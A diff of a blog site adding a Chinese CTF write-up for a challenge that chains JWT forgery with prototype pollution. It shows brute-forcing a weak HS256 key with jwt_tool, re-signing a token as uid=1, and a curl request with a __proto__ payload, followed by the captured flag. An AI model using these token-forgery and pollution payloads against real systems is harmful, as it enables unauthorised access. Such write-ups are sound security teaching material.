@@ -2259,6 +2259,8 @@
       
         
       
+        
+      
     
     
     
@@ -3108,6 +3110,36 @@
   
   
     <li class="md-nav__item">
+      <a href="../%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    原型链污染
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
       <a href="../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-nav__link">
         
   
@@ -3642,6 +3674,245 @@
     <div class="md-post__meta md-meta">
       <ul class="md-meta__list">
         <li class="md-meta__item">
+          <time datetime="2026-11-23 13:30:00+00:00">2026-11-23</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="../web/" class="md-meta__link">Web</a>, 
+              <a href="./" class="md-meta__link">JWT</a>, 
+              <a href="../%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" class="md-meta__link">原型链污染</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 3 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="jwt-uid1-entitlement"><a class="toclink" href="../../geek2019-garlic-vault/">[极客大挑战] 大蒜哥 — JWT 换成 uid=1，再往原型上塞一个 entitlement</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：JWT 伪造（弱密钥）+ 原型链污染</p>
+<p><strong>Flag</strong>：<code>SYC{I_ReAlLy_WaNt_To_PlaY_GTA_6}</code></p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="../../geek2019-garlic-vault/#_1">题目概述</a></h3>
+<p>注册登录后是个“游戏库”页面。<strong>表面上是点卡片启动游戏，实际上真相全在 <code>app.js</code> 里。</strong></p>
+<hr />
+<h3 id="_2"><a class="toclink" href="../../geek2019-garlic-vault/#_2">解题过程</a></h3>
+<h4 id="step-1-token"><a class="toclink" href="../../geek2019-garlic-vault/#step-1-token">Step 1：先看 token 存在哪</a></h4>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">TOKEN_KEY</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"garlic_vault_token"</span><span class="p">;</span>
+</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>
+</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a><span class="kd">function</span><span class="w"> </span><span class="nx">token</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-54-4"><a id="__codelineno-54-4" name="__codelineno-54-4" href="#__codelineno-54-4"></a><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="nx">TOKEN_KEY</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="s2">""</span><span class="p">;</span>
+</span><span id="__span-54-5"><a id="__codelineno-54-5" name="__codelineno-54-5" href="#__codelineno-54-5"></a><span class="p">}</span>
+</span></code></pre></div>
+<p><strong>JWT 存在 <code>localStorage</code>，键名是 <code>garlic_vault_token</code>。</strong></p>
+<p><strong>控制台里直接看：</strong></p>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="s2">"garlic_vault_token"</span><span class="p">))</span>
+</span></code></pre></div>
+<p><strong>拿到 token 之后，再看它是怎么发出去的：</strong></p>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">api</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="nx">options</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{})</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">headers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">...(</span><span class="nx">options</span><span class="p">.</span><span class="nx">headers</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">{})</span><span class="w"> </span><span class="p">};</span>
+</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a><span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">token</span><span class="p">())</span><span class="w"> </span><span class="nx">headers</span><span class="p">.</span><span class="nx">Authorization</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`Bearer </span><span class="si">${</span><span class="nx">token</span><span class="p">()</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
+</span><span id="__span-56-4"><a id="__codelineno-56-4" name="__codelineno-56-4" href="#__codelineno-56-4"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">...</span><span class="nx">options</span><span class="p">,</span><span class="w"> </span><span class="nx">headers</span><span class="w"> </span><span class="p">});</span>
+</span><span id="__span-56-5"><a id="__codelineno-56-5" name="__codelineno-56-5" href="#__codelineno-56-5"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">().</span><span class="k">catch</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">({}));</span>
+</span><span id="__span-56-6"><a id="__codelineno-56-6" name="__codelineno-56-6" href="#__codelineno-56-6"></a><span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">response</span><span class="p">.</span><span class="nx">ok</span><span class="p">)</span><span class="w"> </span><span class="k">throw</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="ne">Error</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">message</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="s2">"服务器暂时没有响应"</span><span class="p">);</span>
+</span><span id="__span-56-7"><a id="__codelineno-56-7" name="__codelineno-56-7" href="#__codelineno-56-7"></a><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">data</span><span class="p">;</span>
+</span><span id="__span-56-8"><a id="__codelineno-56-8" name="__codelineno-56-8" href="#__codelineno-56-8"></a><span class="p">}</span>
+</span></code></pre></div>
+<p><strong>所有请求都自动带上 <code>Authorization: Bearer &lt;token&gt;</code>。</strong></p>
+<p><strong>所以只要能改 token 内容，就能以任意身份调用接口。</strong></p>
+<h4 id="step-2"><a class="toclink" href="../../geek2019-garlic-vault/#step-2">Step 2：代码里直接告诉你该改什么</a></h4>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">loadVault</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a><span class="w">  </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-57-3"><a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a><span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">state</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">api</span><span class="p">(</span><span class="s2">"/api/vault"</span><span class="p">);</span>
+</span><span id="__span-57-4"><a id="__codelineno-57-4" name="__codelineno-57-4" href="#__codelineno-57-4"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">state</span><span class="p">.</span><span class="nx">mode</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s2">"owner"</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-57-5"><a id="__codelineno-57-5" name="__codelineno-57-5" href="#__codelineno-57-5"></a><span class="w">      </span><span class="k">await</span><span class="w"> </span><span class="nx">api</span><span class="p">(</span><span class="s2">"/api/admin/games"</span><span class="p">);</span>
+</span><span id="__span-57-6"><a id="__codelineno-57-6" name="__codelineno-57-6" href="#__codelineno-57-6"></a><span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="nx">loadOwnerPanel</span><span class="p">(</span><span class="nx">state</span><span class="p">.</span><span class="nx">username</span><span class="p">,</span><span class="w"> </span><span class="nx">state</span><span class="p">.</span><span class="nx">consoleScript</span><span class="p">);</span>
+</span><span id="__span-57-7"><a id="__codelineno-57-7" name="__codelineno-57-7" href="#__codelineno-57-7"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-57-8"><a id="__codelineno-57-8" name="__codelineno-57-8" href="#__codelineno-57-8"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">renderVisitor</span><span class="p">(</span><span class="nx">state</span><span class="p">.</span><span class="nx">username</span><span class="p">);</span>
+</span><span id="__span-57-9"><a id="__codelineno-57-9" name="__codelineno-57-9" href="#__codelineno-57-9"></a><span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="nx">_</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-57-10"><a id="__codelineno-57-10" name="__codelineno-57-10" href="#__codelineno-57-10"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">renderLogin</span><span class="p">();</span>
+</span><span id="__span-57-11"><a id="__codelineno-57-11" name="__codelineno-57-11" href="#__codelineno-57-11"></a><span class="w">  </span><span class="p">}</span>
+</span><span id="__span-57-12"><a id="__codelineno-57-12" name="__codelineno-57-12" href="#__codelineno-57-12"></a><span class="p">}</span>
+</span><span id="__span-57-13"><a id="__codelineno-57-13" name="__codelineno-57-13" href="#__codelineno-57-13"></a>
+</span><span id="__span-57-14"><a id="__codelineno-57-14" name="__codelineno-57-14" href="#__codelineno-57-14"></a><span class="c1">// OWNER PROFILE // GARLIC #001</span>
+</span></code></pre></div>
+<p><strong>两个关键信息：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>state.mode === "owner"  → 才会调 /api/admin/games
+</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a>// OWNER PROFILE // GARLIC #001   → 管理员是 #001，也就是 uid = 1
+</span></code></pre></div>
+<p><strong>所以目标是：把 JWT 里的 <code>uid</code> 改成 1。</strong></p>
+<h4 id="step-3-token"><a class="toclink" href="../../geek2019-garlic-vault/#step-3-token">Step 3：解 token，确认字段</a></h4>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a><span class="nb">cd </span><span class="n">E</span><span class="p">:\</span><span class="n">dsh</span><span class="p">\</span><span class="n">tools</span><span class="p">\</span><span class="n">jwt_tool</span>
+</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a><span class="n">python</span> <span class="n">jwt_tool</span><span class="p">.</span><span class="n">py</span> <span class="s2">"&lt;你的token&gt;"</span>
+</span></code></pre></div>
+<p><strong>解出来：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>username = "12"
+</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a>uid      = 2333
+</span><span id="__span-60-3"><a id="__codelineno-60-3" name="__codelineno-60-3" href="#__codelineno-60-3"></a>iat      = 1795410143
+</span><span id="__span-60-4"><a id="__codelineno-60-4" name="__codelineno-60-4" href="#__codelineno-60-4"></a>exp      = 1795417343
+</span><span id="__span-60-5"><a id="__codelineno-60-5" name="__codelineno-60-5" href="#__codelineno-60-5"></a>iss      = "garlic-private-server"
+</span></code></pre></div>
+<p><strong><code>uid: 2333</code> 是普通用户，要改成 <code>1</code>。</strong></p>
+<h4 id="step-4"><a class="toclink" href="../../geek2019-garlic-vault/#step-4">Step 4：爆破签名密钥</a></h4>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a><span class="n">python</span> <span class="n">jwt_tool</span><span class="p">.</span><span class="n">py</span> <span class="s2">"&lt;你的token&gt;"</span> <span class="n">-C</span> <span class="n">-d</span> <span class="s2">"C:\Users\崔路宽\Desktop\dict.txt"</span>
+</span></code></pre></div>
+<p><strong>爆破结果：<code>123123</code></strong></p>
+<p><strong>（这类题密钥几乎一定是纯数字或常见词，小字典跑几十秒就出。）</strong></p>
+<h4 id="step-5-uid1"><a class="toclink" href="../../geek2019-garlic-vault/#step-5-uid1">Step 5：用密钥重签 uid=1</a></h4>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a><span class="n">python</span> <span class="n">jwt_tool</span><span class="p">.</span><span class="n">py</span> <span class="s2">"&lt;你的token&gt;"</span> <span class="n">-I</span> <span class="n">-pc</span> <span class="n">uid</span> <span class="n">-pv</span> <span class="n">1</span> <span class="n">-S</span> <span class="n">hs256</span> <span class="n">-p</span> <span class="n">123123</span>
+</span></code></pre></div>
+<p><strong>得到的 payload 形如：</strong></p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a><span class="p">{</span><span class="nt">"username"</span><span class="p">:</span><span class="s2">"12"</span><span class="p">,</span><span class="nt">"uid"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nt">"iat"</span><span class="p">:</span><span class="mi">1795410143</span><span class="p">,</span><span class="nt">"exp"</span><span class="p">:</span><span class="mi">1795417343</span><span class="p">,</span><span class="nt">"iss"</span><span class="p">:</span><span class="s2">"garlic-private-server"</span><span class="p">}</span>
+</span></code></pre></div>
+<p><strong>把新 token 写回 localStorage，然后刷新页面：</strong></p>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a><span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="s2">"garlic_vault_token"</span><span class="p">,</span><span class="w"> </span><span class="s2">"&lt;新token&gt;"</span><span class="p">)</span>
+</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a><span class="nx">location</span><span class="p">.</span><span class="nx">reload</span><span class="p">()</span>
+</span></code></pre></div>
+<p><strong>刷新后 <code>state.mode</code> 变成 <code>owner</code>，自动进入管理员面板。</strong></p>
+<h4 id="step-6"><a class="toclink" href="../../geek2019-garlic-vault/#step-6">Step 6：面板里的按钮全是装饰</a></h4>
+<p><strong>进去之后点卡片没反应。</strong>打开网络面板看，<strong>按钮只改了页面上的一行字，根本没发请求。</strong></p>
+<p><strong>真正有用的只有一段代码：</strong></p>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">gta6Endpoint</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"/api/admin/gta6/launch"</span><span class="p">;</span>
+</span><span id="__span-65-2"><a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a><span class="kd">const</span><span class="w"> </span><span class="nx">gta6Entitlement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"gta6_play"</span><span class="p">;</span>
+</span><span id="__span-65-3"><a id="__codelineno-65-3" name="__codelineno-65-3" href="#__codelineno-65-3"></a>
+</span><span id="__span-65-4"><a id="__codelineno-65-4" name="__codelineno-65-4" href="#__codelineno-65-4"></a><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">bootGta6</span><span class="p">(</span><span class="nx">app</span><span class="p">,</span><span class="w"> </span><span class="nx">api</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-65-5"><a id="__codelineno-65-5" name="__codelineno-65-5" href="#__codelineno-65-5"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">api</span><span class="p">(</span><span class="nx">gta6Endpoint</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-65-6"><a id="__codelineno-65-6" name="__codelineno-65-6" href="#__codelineno-65-6"></a><span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s2">"POST"</span><span class="p">,</span>
+</span><span id="__span-65-7"><a id="__codelineno-65-7" name="__codelineno-65-7" href="#__codelineno-65-7"></a><span class="w">    </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="s2">"Content-Type"</span><span class="o">:</span><span class="w"> </span><span class="s2">"application/json"</span><span class="w"> </span><span class="p">},</span>
+</span><span id="__span-65-8"><a id="__codelineno-65-8" name="__codelineno-65-8" href="#__codelineno-65-8"></a><span class="w">    </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="w"> </span><span class="nx">game</span><span class="o">:</span><span class="w"> </span><span class="s2">"gta6"</span><span class="p">,</span><span class="w"> </span><span class="nx">settings</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">quality</span><span class="o">:</span><span class="w"> </span><span class="s2">"ultra"</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">})</span>
+</span><span id="__span-65-9"><a id="__codelineno-65-9" name="__codelineno-65-9" href="#__codelineno-65-9"></a><span class="w">  </span><span class="p">});</span>
+</span><span id="__span-65-10"><a id="__codelineno-65-10" name="__codelineno-65-10" href="#__codelineno-65-10"></a><span class="w">  </span><span class="nx">output</span><span class="p">.</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">result</span><span class="p">.</span><span class="nx">flag</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="s2">"GTA6 已启动。"</span><span class="p">;</span>
+</span><span id="__span-65-11"><a id="__codelineno-65-11" name="__codelineno-65-11" href="#__codelineno-65-11"></a><span class="p">}</span>
+</span></code></pre></div>
+<p><strong>注意这两个常量：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>端点          POST /api/admin/gta6/launch
+</span><span id="__span-66-2"><a id="__codelineno-66-2" name="__codelineno-66-2" href="#__codelineno-66-2"></a>权限标识      gta6_play   ← 后端就是看这个
+</span></code></pre></div>
+<p><strong>正常情况下用户没有 <code>gta6_play</code> 这个权限，所以拿不到 flag。</strong></p>
+<h4 id="step-7"><a class="toclink" href="../../geek2019-garlic-vault/#step-7">Step 7：用原型链污染伪造权限</a></h4>
+<p><strong>把请求体里的 <code>settings</code> 换掉，让 <code>gta6_play</code> 出现在</strong>原型链<strong>上：</strong></p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a><span class="p">{</span>
+</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a><span class="w">  </span><span class="nt">"game"</span><span class="p">:</span><span class="w"> </span><span class="s2">"gta6"</span><span class="p">,</span>
+</span><span id="__span-67-3"><a id="__codelineno-67-3" name="__codelineno-67-3" href="#__codelineno-67-3"></a><span class="w">  </span><span class="nt">"settings"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nt">"__proto__"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nt">"gta6_play"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">}</span>
+</span><span id="__span-67-4"><a id="__codelineno-67-4" name="__codelineno-67-4" href="#__codelineno-67-4"></a><span class="p">}</span>
+</span></code></pre></div>
+<p><strong>为什么这样能过：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>后端大概率做了把 settings 合并进某个对象（Object.assign / 展开）的动作
+</span><span id="__span-68-2"><a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a>合并时 __proto__ 会把 gta6_play 挂到 Object.prototype 上
+</span><span id="__span-68-3"><a id="__codelineno-68-3" name="__codelineno-68-3" href="#__codelineno-68-3"></a>之后任何对象查 gta6_play 都会命中 → 权限判断通过
+</span></code></pre></div>
+<p><strong>这就是原型链污染：</strong>你没有那个字段，但你的<strong>原型</strong>有。**</p>
+<p><strong>拿 flag 的请求：</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">-X</span> <span class="n">POST</span> <span class="s2">"http://目标/api/admin/gta6/launch"</span> <span class="p">`</span>
+</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a>  <span class="n">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="p">`</span>
+</span><span id="__span-69-3"><a id="__codelineno-69-3" name="__codelineno-69-3" href="#__codelineno-69-3"></a>  <span class="n">-H</span> <span class="s2">"Authorization: Bearer &lt;uid=1的token&gt;"</span> <span class="p">`</span>
+</span><span id="__span-69-4"><a id="__codelineno-69-4" name="__codelineno-69-4" href="#__codelineno-69-4"></a>  <span class="n">-d</span> <span class="s1">'{\"game\":\"gta6\",\"settings\":{\"__proto__\":{\"gta6_play\":true}}}'</span>
+</span></code></pre></div>
+<p><strong>返回里的 <code>flag</code> 字段就是答案：</strong></p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a><span class="p">{</span><span class="nt">"unlocked"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nt">"title"</span><span class="p">:</span><span class="s2">"一男一女 / GTA6"</span><span class="p">,</span><span class="nt">"flag"</span><span class="p">:</span><span class="s2">"SYC{I_ReAlLy_WaNt_To_PlaY_GTA_6}"</span><span class="p">}</span>
+</span></code></pre></div>
+<p><strong><code>unlocked: true</code> 这一项就是被污染出来的权限——原本用户并没有 <code>gta6_play</code>。</strong></p>
+<hr />
+<table>
+<thead>
+<tr>
+<th>环节</th>
+<th>关键点</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>token 位置</td>
+<td><code>localStorage["garlic_vault_token"]</code></td>
+</tr>
+<tr>
+<td>发送方式</td>
+<td>每个请求自动加 <code>Authorization: Bearer</code></td>
+</tr>
+<tr>
+<td>身份判断</td>
+<td><code>state.mode === "owner"</code> 才进管理面板</td>
+</tr>
+<tr>
+<td>改名线索</td>
+<td>注释 <code>// OWNER PROFILE // GARLIC #001</code> → uid=1</td>
+</tr>
+<tr>
+<td>密钥</td>
+<td>爆破得 <code>123123</code></td>
+</tr>
+<tr>
+<td>重签</td>
+<td>只改 <code>uid</code>，其他字段原样保留</td>
+</tr>
+<tr>
+<td>按钮无效</td>
+<td>纯前端装饰，真正接口是 <code>/api/admin/gta6/launch</code></td>
+</tr>
+<tr>
+<td>权限标识</td>
+<td><code>gta6_play</code>（前端常量名 <code>gta6Entitlement</code>）</td>
+</tr>
+<tr>
+<td>污染点</td>
+<td><code>settings</code> 里的 <code>__proto__</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<details class="note">
+<summary>完整流程</summary>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a><span class="c"># ① 看 token</span>
+</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a><span class="c"># 浏览器控制台：localStorage.getItem("garlic_vault_token")</span>
+</span><span id="__span-71-3"><a id="__codelineno-71-3" name="__codelineno-71-3" href="#__codelineno-71-3"></a>
+</span><span id="__span-71-4"><a id="__codelineno-71-4" name="__codelineno-71-4" href="#__codelineno-71-4"></a><span class="c"># ② 解析 + 爆破</span>
+</span><span id="__span-71-5"><a id="__codelineno-71-5" name="__codelineno-71-5" href="#__codelineno-71-5"></a><span class="n">python</span> <span class="n">jwt_tool</span><span class="p">.</span><span class="n">py</span> <span class="s2">"&lt;token&gt;"</span> <span class="n">-C</span> <span class="n">-d</span> <span class="n">dict</span><span class="p">.</span><span class="n">txt</span>        <span class="c"># → 123123</span>
+</span><span id="__span-71-6"><a id="__codelineno-71-6" name="__codelineno-71-6" href="#__codelineno-71-6"></a>
+</span><span id="__span-71-7"><a id="__codelineno-71-7" name="__codelineno-71-7" href="#__codelineno-71-7"></a><span class="c"># ③ 重签 uid=1</span>
+</span><span id="__span-71-8"><a id="__codelineno-71-8" name="__codelineno-71-8" href="#__codelineno-71-8"></a><span class="n">python</span> <span class="n">jwt_tool</span><span class="p">.</span><span class="n">py</span> <span class="s2">"&lt;token&gt;"</span> <span class="n">-I</span> <span class="n">-pc</span> <span class="n">uid</span> <span class="n">-pv</span> <span class="n">1</span> <span class="n">-S</span> <span class="n">hs256</span> <span class="n">-p</span> <span class="n">123123</span>
+</span><span id="__span-71-9"><a id="__codelineno-71-9" name="__codelineno-71-9" href="#__codelineno-71-9"></a>
+</span><span id="__span-71-10"><a id="__codelineno-71-10" name="__codelineno-71-10" href="#__codelineno-71-10"></a><span class="c"># ④ 写回并刷新</span>
+</span><span id="__span-71-11"><a id="__codelineno-71-11" name="__codelineno-71-11" href="#__codelineno-71-11"></a><span class="c"># localStorage.setItem("garlic_vault_token","&lt;新token&gt;"); location.reload()</span>
+</span><span id="__span-71-12"><a id="__codelineno-71-12" name="__codelineno-71-12" href="#__codelineno-71-12"></a>
+</span><span id="__span-71-13"><a id="__codelineno-71-13" name="__codelineno-71-13" href="#__codelineno-71-13"></a><span class="c"># ⑤ 原型链污染拿 flag</span>
+</span><span id="__span-71-14"><a id="__codelineno-71-14" name="__codelineno-71-14" href="#__codelineno-71-14"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">-X</span> <span class="n">POST</span> <span class="s2">"http://目标/api/admin/gta6/launch"</span> <span class="p">`</span>
+</span><span id="__span-71-15"><a id="__codelineno-71-15" name="__codelineno-71-15" href="#__codelineno-71-15"></a>  <span class="n">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="p">`</span>
+</span><span id="__span-71-16"><a id="__codelineno-71-16" name="__codelineno-71-16" href="#__codelineno-71-16"></a>  <span class="n">-H</span> <span class="s2">"Authorization: Bearer &lt;新token&gt;"</span> <span class="p">`</span>
+</span><span id="__span-71-17"><a id="__codelineno-71-17" name="__codelineno-71-17" href="#__codelineno-71-17"></a>  <span class="n">-d</span> <span class="s1">'{"game":"gta6","settings":{"__proto__":{"gta6_play":true}}}'</span>
+</span></code></pre></div>
+</details>
+<details class="note">
+<summary>这题踩的坑</summary>
+<p><strong>① 进了面板就到处点</strong></p>
+<p><strong>卡片是纯前端装饰</strong>，点了只改页面文字。<strong>真正的价值在“网络”面板里那条 <code>console-script</code> / <code>gta6/launch</code> 请求。</strong></p>
+<p><strong>② 以为改了 uid 就能直接拿 flag</strong></p>
+<p><strong>uid=1 只给你“进门”的资格</strong>，<code>gta6_play</code> 这个权限还得自己造——<strong>这才是这题的第二个考点。</strong></p>
+<p><strong>③ 重签时把 iat/exp 写死成旧值</strong></p>
+<p><strong>token 有有效期</strong>，改签时最好把 <code>iat</code>/<code>exp</code> 更新到当前时间，否则改完还是过期。</p>
+<p><strong>④ <code>__proto__</code> 拼错</strong></p>
+<p>是<strong>两个下划线</strong>：<code>__proto__</code>。写成 <code>__potor__</code> 之类的，服务端只会把它当成一个普通字段，什么都不会发生。</p>
+</details>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
